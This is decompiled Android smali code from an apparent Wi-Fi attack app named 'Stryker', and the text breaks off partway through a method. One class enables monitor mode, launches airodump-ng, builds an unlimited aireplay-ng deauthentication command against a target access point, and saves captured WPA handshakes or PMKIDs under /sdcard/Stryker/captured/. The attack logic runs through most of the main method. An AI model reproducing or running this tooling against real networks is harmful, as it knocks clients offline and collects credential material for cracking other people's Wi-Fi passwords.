.class public final Lh9/m;
.super Lf9/g;
.source "SourceFile"


# instance fields
.field public final synthetic e:Landroid/widget/ImageView;

.field public final synthetic f:Landroid/widget/ProgressBar;

.field public final synthetic g:Landroid/widget/TextView;

.field public final synthetic h:Lcom/google/android/material/card/MaterialCardView;

.field public final synthetic i:Landroid/widget/TextView;

.field public final synthetic j:[Z

.field public final synthetic k:[Z

.field public final synthetic l:Landroid/widget/TextView;

.field public final synthetic m:Ljava/lang/String;

.field public final synthetic n:Ljava/lang/String;

.field public final synthetic o:Lh8/o;

.field public final synthetic p:[Ljava/lang/String;

.field public final synthetic q:[Ljava/lang/String;

.field public final synthetic r:Ljava/util/Timer;

.field public final synthetic s:Lh9/t;


# direct methods
.method public constructor <init>(Lh9/t;Landroid/app/Activity;Landroid/content/Context;Landroid/widget/ImageView;Landroid/widget/ProgressBar;Landroid/widget/TextView;Lcom/google/android/material/card/MaterialCardView;Landroid/widget/TextView;[Z[ZLandroid/widget/TextView;Ljava/lang/String;Ljava/lang/String;Lh8/o;[Ljava/lang/String;[Ljava/lang/String;Ljava/util/Timer;)V
    .locals 3

    move-object v0, p0

    move-object v1, p1

    iput-object v1, v0, Lh9/m;->s:Lh9/t;

    move-object v1, p4

    iput-object v1, v0, Lh9/m;->e:Landroid/widget/ImageView;

    move-object v1, p5

    iput-object v1, v0, Lh9/m;->f:Landroid/widget/ProgressBar;

    move-object v1, p6

    iput-object v1, v0, Lh9/m;->g:Landroid/widget/TextView;

    move-object v1, p7

    iput-object v1, v0, Lh9/m;->h:Lcom/google/android/material/card/MaterialCardView;

    move-object v1, p8

    iput-object v1, v0, Lh9/m;->i:Landroid/widget/TextView;

    move-object v1, p9

    iput-object v1, v0, Lh9/m;->j:[Z

    move-object v1, p10

    iput-object v1, v0, Lh9/m;->k:[Z

    move-object v1, p11

    iput-object v1, v0, Lh9/m;->l:Landroid/widget/TextView;

    move-object v1, p12

    iput-object v1, v0, Lh9/m;->m:Ljava/lang/String;

    move-object/from16 v1, p13

    iput-object v1, v0, Lh9/m;->n:Ljava/lang/String;

    move-object/from16 v1, p14

    iput-object v1, v0, Lh9/m;->o:Lh8/o;

    move-object/from16 v1, p15

    iput-object v1, v0, Lh9/m;->p:[Ljava/lang/String;

    move-object/from16 v1, p16

    iput-object v1, v0, Lh9/m;->q:[Ljava/lang/String;

    move-object/from16 v1, p17

    iput-object v1, v0, Lh9/m;->r:Ljava/util/Timer;

    move-object v1, p2

    move-object v2, p3

    invoke-direct {p0, p2, p3}, Lf9/g;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    return-void
.end method


# virtual methods
.method public final a()V
    .locals 18

    .line 1
    move-object/from16 v9, p0

    .line 2
    .line 3
    new-instance v10, Ljava/util/ArrayList;

    .line 4
    .line 5
    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    .line 6
    .line 7
    .line 8
    iget-object v0, v9, Lh9/m;->m:Ljava/lang/String;

    .line 9
    .line 10
    const-string v1, "wlan0"

    .line 11
    .line 12
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 13
    .line 14
    .line 15
    move-result v2

    .line 16
    const/4 v11, 0x1

    .line 17
    xor-int/lit8 v12, v2, 0x1

    .line 18
    .line 19
    const-string v2, "Enabling monitor mode..."

    .line 20
    .line 21
    invoke-virtual {v9, v2}, Lf9/g;->e(Ljava/lang/String;)V

    .line 22
    .line 23
    .line 24
    sget-object v2, Lf9/g;->d:Lf9/m;

    .line 25
    .line 26
    iget-object v2, v2, Lf9/m;->d:Lf9/n;

    .line 27
    .line 28
    iget-object v13, v9, Lh9/m;->o:Lh8/o;

    .line 29
    .line 30
    if-eqz v12, :cond_0

    .line 31
    .line 32
    iget v3, v13, Lh8/o;->j:I

    .line 33
    .line 34
    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v3

    .line 38
    iget-object v4, v9, Lh9/m;->n:Ljava/lang/String;

    .line 39
    .line 40
    invoke-virtual {v2, v4, v3}, Lf9/n;->d(Ljava/lang/String;Ljava/lang/String;)Z

    .line 41
    .line 42
    .line 43
    move-result v2

    .line 44
    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 45
    .line 46
    .line 47
    move-result v3

    .line 48
    if-nez v3, :cond_1

    .line 49
    .line 50
    sget-object v3, Lf9/g;->d:Lf9/m;

    .line 51
    .line 52
    iget-object v3, v3, Lf9/m;->d:Lf9/n;

    .line 53
    .line 54
    iget v4, v13, Lh8/o;->j:I

    .line 55
    .line 56
    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 57
    .line 58
    .line 59
    move-result-object v4

    .line 60
    invoke-virtual {v3, v0, v4}, Lf9/n;->d(Ljava/lang/String;Ljava/lang/String;)Z

    .line 61
    .line 62
    .line 63
    move-result v0

    .line 64
    goto :goto_0

    .line 65
    :cond_0
    invoke-virtual {v2, v0}, Lf9/n;->c(Ljava/lang/String;)Z

    .line 66
    .line 67
    .line 68
    move-result v2

    .line 69
    :cond_1
    move v0, v11

    .line 70
    :goto_0
    new-array v14, v11, [Z

    .line 71
    .line 72
    const/4 v15, 0x0

    .line 73
    aput-boolean v15, v14, v15

    .line 74
    .line 75
    if-eqz v2, :cond_b

    .line 76
    .line 77
    if-eqz v0, :cond_b

    .line 78
    .line 79
    const-string v0, "Starting airodump-ng..."

    .line 80
    .line 81
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 82
    .line 83
    .line 84
    sget-object v0, Lf9/g;->d:Lf9/m;

    .line 85
    .line 86
    new-instance v2, Ljava/lang/StringBuilder;

    .line 87
    .line 88
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 89
    .line 90
    .line 91
    sget-object v3, Lf9/g;->d:Lf9/m;

    .line 92
    .line 93
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 94
    .line 95
    .line 96
    invoke-static {}, Lf9/m;->H()Ljava/lang/String;

    .line 97
    .line 98
    .line 99
    move-result-object v3

    .line 100
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 101
    .line 102
    .line 103
    const-string v8, "Stryker/hs/handshake-01.cap"

    .line 104
    .line 105
    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 106
    .line 107
    .line 108
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 109
    .line 110
    .line 111
    move-result-object v2

    .line 112
    invoke-virtual {v0, v2}, Lf9/m;->q(Ljava/lang/String;)V

    .line 113
    .line 114
    .line 115
    sget-object v0, Lf9/g;->d:Lf9/m;

    .line 116
    .line 117
    invoke-virtual {v0}, Lf9/m;->A()Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    move-result-object v0

    .line 121
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 122
    .line 123
    .line 124
    move-result v0

    .line 125
    if-eqz v0, :cond_2

    .line 126
    .line 127
    new-instance v0, Ljava/lang/Thread;

    .line 128
    .line 129
    new-instance v1, Lh9/k;

    .line 130
    .line 131
    invoke-direct {v1, v15, v13}, Lh9/k;-><init>(ILjava/lang/Object;)V

    .line 132
    .line 133
    .line 134
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 135
    .line 136
    .line 137
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 138
    .line 139
    .line 140
    :cond_2
    new-instance v0, Ljava/lang/Thread;

    .line 141
    .line 142
    iget-object v3, v9, Lh9/m;->o:Lh8/o;

    .line 143
    .line 144
    iget-object v5, v9, Lh9/m;->p:[Ljava/lang/String;

    .line 145
    .line 146
    iget-object v7, v9, Lh9/m;->j:[Z

    .line 147
    .line 148
    iget-object v6, v9, Lh9/m;->k:[Z

    .line 149
    .line 150
    new-instance v4, Ll8/b;

    .line 151
    .line 152
    move-object v1, v4

    .line 153
    move-object/from16 v2, p0

    .line 154
    .line 155
    move-object v11, v4

    .line 156
    move-object v4, v14

    .line 157
    move-object/from16 v16, v6

    .line 158
    .line 159
    move-object v6, v10

    .line 160
    move-object/from16 v17, v8

    .line 161
    .line 162
    move-object/from16 v8, v16

    .line 163
    .line 164
    invoke-direct/range {v1 .. v8}, Ll8/b;-><init>(Lh9/m;Lh8/o;[Z[Ljava/lang/String;Ljava/util/ArrayList;[Z[Z)V

    .line 165
    .line 166
    .line 167
    invoke-direct {v0, v11}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 168
    .line 169
    .line 170
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 171
    .line 172
    .line 173
    const-string v0, "We are waiting for network to appear..."

    .line 174
    .line 175
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 176
    .line 177
    .line 178
    :goto_1
    aget-boolean v0, v14, v15

    .line 179
    .line 180
    if-nez v0, :cond_3

    .line 181
    .line 182
    const-wide/16 v0, 0x3e8

    .line 183
    .line 184
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 185
    .line 186
    .line 187
    goto :goto_1

    .line 188
    :catch_0
    move-exception v0

    .line 189
    move-object v1, v0

    .line 190
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 191
    .line 192
    .line 193
    goto :goto_1

    .line 194
    :cond_3
    const-string v0, "Airodump-ng launched!"

    .line 195
    .line 196
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 197
    .line 198
    .line 199
    if-nez v12, :cond_4

    .line 200
    .line 201
    const-string v0, "Can`t deauth with (s)wlan0 interface! Passive mode!"

    .line 202
    .line 203
    goto :goto_2

    .line 204
    :cond_4
    const-string v0, "Starting deauth..."

    .line 205
    .line 206
    :goto_2
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 207
    .line 208
    .line 209
    iget-object v11, v9, Lh9/m;->s:Lh9/t;

    .line 210
    .line 211
    const-string v14, " "

    .line 212
    .line 213
    if-eqz v12, :cond_5

    .line 214
    .line 215
    new-instance v0, Lm8/a;

    .line 216
    .line 217
    sget-object v3, Lf9/g;->b:Landroid/app/Activity;

    .line 218
    .line 219
    sget-object v4, Lf9/g;->c:Landroid/content/Context;

    .line 220
    .line 221
    new-instance v1, Ljava/lang/StringBuilder;

    .line 222
    .line 223
    const-string v2, "aireplay-ng --ignore-negative-one -0 0 -a  "

    .line 224
    .line 225
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 226
    .line 227
    .line 228
    invoke-virtual {v13}, Lh8/o;->a()Ljava/lang/String;

    .line 229
    .line 230
    .line 231
    move-result-object v2

    .line 232
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 233
    .line 234
    .line 235
    invoke-virtual {v1, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 236
    .line 237
    .line 238
    sget-object v2, Lf9/g;->d:Lf9/m;

    .line 239
    .line 240
    invoke-virtual {v2}, Lf9/m;->v()Ljava/lang/String;

    .line 241
    .line 242
    .line 243
    move-result-object v2

    .line 244
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 245
    .line 246
    .line 247
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 248
    .line 249
    .line 250
    move-result-object v5

    .line 251
    const/4 v6, 0x2

    .line 252
    move-object v1, v0

    .line 253
    move-object/from16 v2, p0

    .line 254
    .line 255
    invoke-direct/range {v1 .. v6}, Lm8/a;-><init>(Ljava/lang/Object;Landroid/app/Activity;Landroid/content/Context;Ljava/lang/String;I)V

    .line 256
    .line 257
    .line 258
    iput-object v0, v11, Lh9/t;->i:Lf9/b;

    .line 259
    .line 260
    :cond_5
    :goto_3
    iget-object v0, v9, Lh9/m;->j:[Z

    .line 261
    .line 262
    aget-boolean v1, v0, v15

    .line 263
    .line 264
    if-nez v1, :cond_7

    .line 265
    .line 266
    iget-object v1, v9, Lh9/m;->k:[Z

    .line 267
    .line 268
    aget-boolean v2, v1, v15

    .line 269
    .line 270
    if-nez v2, :cond_7

    .line 271
    .line 272
    new-instance v4, Ljava/lang/StringBuilder;

    .line 273
    .line 274
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 275
    .line 276
    .line 277
    invoke-virtual {v10}, Ljava/util/ArrayList;->size()I

    .line 278
    .line 279
    .line 280
    move-result v2

    .line 281
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 282
    .line 283
    .line 284
    move-result-object v2

    .line 285
    const-string v3, "Clients"

    .line 286
    .line 287
    invoke-static {v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 288
    .line 289
    .line 290
    new-instance v2, Ljava/lang/StringBuilder;

    .line 291
    .line 292
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 293
    .line 294
    .line 295
    aget-boolean v0, v0, v15

    .line 296
    .line 297
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 298
    .line 299
    .line 300
    invoke-virtual {v2, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 301
    .line 302
    .line 303
    aget-boolean v0, v1, v15

    .line 304
    .line 305
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 306
    .line 307
    .line 308
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 309
    .line 310
    .line 311
    move-result-object v0

    .line 312
    const-string v1, "Status: "

    .line 313
    .line 314
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 315
    .line 316
    .line 317
    invoke-virtual {v10}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 318
    .line 319
    .line 320
    move-result-object v0

    .line 321
    :goto_4
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 322
    .line 323
    .line 324
    move-result v1

    .line 325
    if-eqz v1, :cond_6

    .line 326
    .line 327
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 328
    .line 329
    .line 330
    move-result-object v1

    .line 331
    check-cast v1, Ljava/lang/String;

    .line 332
    .line 333
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 334
    .line 335
    .line 336
    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 337
    .line 338
    .line 339
    goto :goto_4

    .line 340
    :cond_6
    sget-object v0, Lf9/g;->b:Landroid/app/Activity;

    .line 341
    .line 342
    const-string v2, "<b><p style=\'color:#2E7D32\'>Airodump-ng running normally - {s}</p></b>\n\n<p>{deauth}</p>\n\n\n\n<b><p>Clients (total - {total}): {clients}</p></b>\n\n"

    .line 343
    .line 344
    iget-object v3, v9, Lh9/m;->p:[Ljava/lang/String;

    .line 345
    .line 346
    iget-object v6, v9, Lh9/m;->q:[Ljava/lang/String;

    .line 347
    .line 348
    iget-object v7, v9, Lh9/m;->o:Lh8/o;

    .line 349
    .line 350
    iget-object v8, v9, Lh9/m;->l:Landroid/widget/TextView;

    .line 351
    .line 352
    new-instance v12, Ll8/b;

    .line 353
    .line 354
    move-object v1, v12

    .line 355
    move-object v5, v10

    .line 356
    invoke-direct/range {v1 .. v8}, Ll8/b;-><init>(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/util/ArrayList;[Ljava/lang/String;Lh8/o;Landroid/widget/TextView;)V

    .line 357
    .line 358
    .line 359
    invoke-virtual {v0, v12}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 360
    .line 361
    .line 362
    const-wide/16 v0, 0xc8

    .line 363
    .line 364
    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 365
    .line 366
    .line 367
    goto :goto_3

    .line 368
    :catch_1
    move-exception v0

    .line 369
    move-object v1, v0

    .line 370
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 371
    .line 372
    .line 373
    goto :goto_3

    .line 374
    :cond_7
    iget-object v1, v11, Lh9/t;->i:Lf9/b;

    .line 375
    .line 376
    if-eqz v1, :cond_8

    .line 377
    .line 378
    invoke-static {}, Lf9/b;->a()V

    .line 379
    .line 380
    .line 381
    :cond_8
    iget-object v1, v11, Lh9/t;->m:Lp8/v;

    .line 382
    .line 383
    if-eqz v1, :cond_9

    .line 384
    .line 385
    invoke-static {}, Lf9/b;->a()V

    .line 386
    .line 387
    .line 388
    :cond_9
    aget-boolean v0, v0, v15

    .line 389
    .line 390
    const-string v1, "Stryker/captured/"

    .line 391
    .line 392
    const-string v2, ".cap"

    .line 393
    .line 394
    const-string v3, "_"

    .line 395
    .line 396
    const-string v4, "MM_HH_mm"

    .line 397
    .line 398
    if-eqz v0, :cond_a

    .line 399
    .line 400
    const-string v0, "Handshake captured!"

    .line 401
    .line 402
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 403
    .line 404
    .line 405
    new-instance v0, Ljava/lang/StringBuilder;

    .line 406
    .line 407
    const-string v5, "HS_"

    .line 408
    .line 409
    invoke-direct {v0, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 410
    .line 411
    .line 412
    new-instance v5, Ljava/text/SimpleDateFormat;

    .line 413
    .line 414
    invoke-direct {v5, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 415
    .line 416
    .line 417
    new-instance v4, Ljava/util/Date;

    .line 418
    .line 419
    invoke-direct {v4}, Ljava/util/Date;-><init>()V

    .line 420
    .line 421
    .line 422
    invoke-virtual {v5, v4}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 423
    .line 424
    .line 425
    move-result-object v4

    .line 426
    iget-object v5, v13, Lh8/o;->c:Ljava/lang/String;

    .line 427
    .line 428
    invoke-virtual {v5, v14, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    .line 429
    .line 430
    .line 431
    move-result-object v3

    .line 432
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 433
    .line 434
    .line 435
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 436
    .line 437
    .line 438
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 439
    .line 440
    .line 441
    sget-object v2, Lf9/g;->d:Lf9/m;

    .line 442
    .line 443
    new-instance v3, Ljava/lang/StringBuilder;

    .line 444
    .line 445
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 446
    .line 447
    .line 448
    sget-object v4, Lf9/g;->d:Lf9/m;

    .line 449
    .line 450
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 451
    .line 452
    .line 453
    invoke-static {}, Lf9/m;->H()Ljava/lang/String;

    .line 454
    .line 455
    .line 456
    move-result-object v4

    .line 457
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 458
    .line 459
    .line 460
    move-object/from16 v5, v17

    .line 461
    .line 462
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 463
    .line 464
    .line 465
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 466
    .line 467
    .line 468
    move-result-object v3

    .line 469
    new-instance v4, Ljava/lang/StringBuilder;

    .line 470
    .line 471
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 472
    .line 473
    .line 474
    sget-object v5, Lf9/g;->d:Lf9/m;

    .line 475
    .line 476
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 477
    .line 478
    .line 479
    invoke-static {}, Lf9/m;->H()Ljava/lang/String;

    .line 480
    .line 481
    .line 482
    move-result-object v5

    .line 483
    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 484
    .line 485
    .line 486
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 487
    .line 488
    .line 489
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 490
    .line 491
    .line 492
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 493
    .line 494
    .line 495
    move-result-object v1

    .line 496
    invoke-virtual {v2, v3, v1}, Lf9/m;->N(Ljava/lang/String;Ljava/lang/String;)V

    .line 497
    .line 498
    .line 499
    new-instance v1, Ljava/lang/StringBuilder;

    .line 500
    .line 501
    const-string v2, "Handshake saved to /sdcard/Stryker/captured/"

    .line 502
    .line 503
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 504
    .line 505
    .line 506
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 507
    .line 508
    .line 509
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 510
    .line 511
    .line 512
    move-result-object v0

    .line 513
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 514
    .line 515
    .line 516
    sget-object v0, Lf9/g;->b:Landroid/app/Activity;

    .line 517
    .line 518
    new-instance v1, Lh9/l;

    .line 519
    .line 520
    invoke-direct {v1, v9, v15}, Lh9/l;-><init>(Lh9/m;I)V

    .line 521
    .line 522
    .line 523
    goto/16 :goto_5

    .line 524
    .line 525
    :cond_a
    move-object/from16 v5, v17

    .line 526
    .line 527
    const-string v0, "PMKID captured!"

    .line 528
    .line 529
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 530
    .line 531
    .line 532
    new-instance v0, Ljava/lang/StringBuilder;

    .line 533
    .line 534
    const-string v6, "PMKID_"

    .line 535
    .line 536
    invoke-direct {v0, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 537
    .line 538
    .line 539
    new-instance v6, Ljava/text/SimpleDateFormat;

    .line 540
    .line 541
    invoke-direct {v6, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 542
    .line 543
    .line 544
    new-instance v4, Ljava/util/Date;

    .line 545
    .line 546
    invoke-direct {v4}, Ljava/util/Date;-><init>()V

    .line 547
    .line 548
    .line 549
    invoke-virtual {v6, v4}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 550
    .line 551
    .line 552
    move-result-object v4

    .line 553
    iget-object v6, v13, Lh8/o;->c:Ljava/lang/String;

    .line 554
    .line 555
    invoke-virtual {v6, v14, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    .line 556
    .line 557
    .line 558
    move-result-object v3

    .line 559
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 560
    .line 561
    .line 562
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 563
    .line 564
    .line 565
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 566
    .line 567
    .line 568
    sget-object v2, Lf9/g;->d:Lf9/m;

    .line 569
    .line 570
    new-instance v3, Ljava/lang/StringBuilder;

    .line 571
    .line 572
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 573
    .line 574
    .line 575
    sget-object v4, Lf9/g;->d:Lf9/m;

    .line 576
    .line 577
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 578
    .line 579
    .line 580
    invoke-static {}, Lf9/m;->H()Ljava/lang/String;

    .line 581
    .line 582
    .line 583
    move-result-object v4

    .line 584
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 585
    .line 586
    .line 587
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 588
    .line 589
    .line 590
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 591
    .line 592
    .line 593
    move-result-object v3

    .line 594
    new-instance v4, Ljava/lang/StringBuilder;

    .line 595
    .line 596
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 597
    .line 598
    .line 599
    sget-object v5, Lf9/g;->d:Lf9/m;

    .line 600
    .line 601
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 602
    .line 603
    .line 604
    invoke-static {}, Lf9/m;->H()Ljava/lang/String;

    .line 605
    .line 606
    .line 607
    move-result-object v5

    .line 608
    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 609
    .line 610
    .line 611
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 612
    .line 613
    .line 614
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 615
    .line 616
    .line 617
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 618
    .line 619
    .line 620
    move-result-object v1

    .line 621
    invoke-virtual {v2, v3, v1}, Lf9/m;->N(Ljava/lang/String;Ljava/lang/String;)V

    .line 622
    .line 623
    .line 624
    new-instance v1, Ljava/lang/StringBuilder;

    .line 625
    .line 626
    const-string v2, "PMKID saved to /sdcard/Stryker/captured/"

    .line 627
    .line 628
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 629
    .line 630
    .line 631
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 632
    .line 633
    .line 634
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 635
    .line 636
    .line 637
    move-result-object v0

    .line 638
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 639
    .line 640
    .line 641
    sget-object v0, Lf9/g;->b:Landroid/app/Activity;

    .line 642
    .line 643
    new-instance v1, Lh9/l;

    .line 644
    .line 645
    const/4 v2, 0x1

    .line 646
    invoke-direct {v1, v9, v2}, Lh9/l;-><init>(Lh9/m;I)V

    .line 647
    .line 648
    .line 649
    :goto_5
    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 650
    .line 651
    .line 652
    goto :goto_6

    .line 653
    :cond_b
    const-string v0, "Failed to start monitor mode"

    .line 654
    .line 655
    invoke-virtual {v9, v0}, Lf9/g;->e(Ljava/lang/String;)V

    .line 656
    .line 657
    .line 658
    invoke-virtual/range {p0 .. p0}, Lf9/g;->f()V

    .line 659
    .line 660
    .line 661
    :goto_6
    return-void
.end method

.method public final b(Ljava/lang/String;)V
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lh9/m;->l:Landroid/widget/TextView;

    invoke-virtual {v0, p1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    iget-object p1, p0, Lh9/m;->s:Lh9/t;

    invoke-virtual {p1, v0}, Lh9/t;->n(Landroid/widget/TextView;)V

    return-void
.end method

.method public final c()V
    .locals 9

    const-string v0, "Attack was canceled due to critical error, please check log for more information!"

    invoke-virtual {p0, v0}, Lf9/g;->e(Ljava/lang/String;)V

    sget-object v0, Lf9/g;->b:Landroid/app/Activity;

    iget-object v3, p0, Lh9/m;->e:Landroid/widget/ImageView;

    iget-object v4, p0, Lh9/m;->f:Landroid/widget/ProgressBar;

